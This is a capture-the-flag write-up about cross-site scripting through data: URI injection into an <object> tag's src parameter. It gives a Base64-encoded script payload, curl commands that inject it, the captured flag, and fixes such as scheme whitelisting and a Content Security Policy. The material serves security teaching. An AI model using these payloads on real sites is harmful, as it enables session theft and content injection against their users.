# Media Data URI - XSS via data: URI Injection

## Breach Type
**Cross-Site Scripting (XSS) / Injection** — OWASP Top 10: A03:2021 Injection

## What is this Vulnerability?
**XSS via data: URI injection** is a type of Cross-Site Scripting where an attacker injects a `data:` URI into a page element (like `<object>`, `<iframe>`, or `<embed>`) to execute arbitrary JavaScript in the victim's browser.

A `data:` URI allows embedding data directly in URLs using the format: `data:[mediatype][;base64],<data>`. For example:
- `data:text/html,<h1>Hello</h1>` renders HTML directly
- `data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=` decodes from Base64 and runs `<script>alert('XSS')</script>`

In this case, the website loads media using an `<object>` tag with a user-controlled `src` parameter. Since the application doesn't validate the URL scheme (it allows `data:` instead of only `http:`/`https:`), the attacker can embed and execute arbitrary HTML/JavaScript.

The Base64 encoding makes the payload look innocent in the URL — `PHNjcmlwdD5...` doesn't look like code to a casual observer or basic security filter.

### Why is it dangerous?
- **Script execution**: Arbitrary JavaScript runs in the user's browser session
- **Cookie theft**: `document.cookie` can be exfiltrated to steal sessions
- **Bypasses basic filters**: Base64 encoding evades simple pattern-matching filters looking for `<script>` tags
- **Content injection**: Can display fake login forms, fake error messages, or phishing content
- **Persistent if cached**: If the URL is shared or bookmarked, the attack persists

### Real-world impact
Data URI-based XSS has been found in major browsers and applications. It's commonly used to bypass email security filters and Content Security Policies (CSP) when misconfigured.

## Where
URL: `http://<IP>/?page=media&src=...`
The Media page which loads content via a `src` parameter into an `<object>` tag.

## How I Found It
1. While exploring the site, navigated to `?page=media`.
2. Noticed the URL accepts a `src` parameter that gets embedded in an `<object>` tag.
3. The `src` value is an `nsa_prism.jpg` image file loaded via the `<object>` tag.
4. Tested injecting a **data: URI** with Base64-encoded HTML/JavaScript.
5. The server does not validate or sanitize the `src` parameter — it accepts data URIs!

## Step-by-Step Exploitation

### Step 1: Create the XSS Payload
Create a simple JavaScript alert:
```html
<script>alert('XSS')</script>
```

### Step 2: Base64 Encode It
```bash
echo -n "<script>alert('XSS')</script>" | base64
# Output: PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
```

### Step 3: Construct the data: URI
```
data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
```

### Step 4: Inject via the src Parameter
```bash
curl "http://<IP>/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="
```

### Step 5: Get the Flag
The server responds with the flag:
```
The flag is 928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d
```

## Flag
```
928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d
```

## How to Test Manually
1. Open your browser to `http://<IP>/?page=media`
2. In the URL bar, change the URL to:
   ```
   http://<IP>/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
   ```
3. Press Enter — the flag should appear on the page

**Or using curl:**
```bash
curl "http://<IP>/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="
```

**Decoding the payload:**
```bash
echo "PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=" | base64 -d
# Output: <script>alert('XSS')</script>
```

## How to Fix
- **Whitelist allowed protocols** for the `src` parameter (only `http://` and `https://`)
- **Block `data:` URIs** — they should never be allowed in user-controlled parameters
- **Validate the `src` value** against a list of known/allowed resources
- Use **Content Security Policy (CSP)** headers to restrict inline scripts and data URIs:
  ```
  Content-Security-Policy: default-src 'self'; object-src 'self'
  ```
- **Sanitize and encode** all user input before embedding in HTML
- Avoid using `<object>` tags with user-controlled sources — use `<img>` with strict validation instead

## OWASP Reference
- [XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Scripting_Prevention_Cheat_Sheet.html)
- [Injection](https://owasp.org/Top10/A03_2021-Injection/)
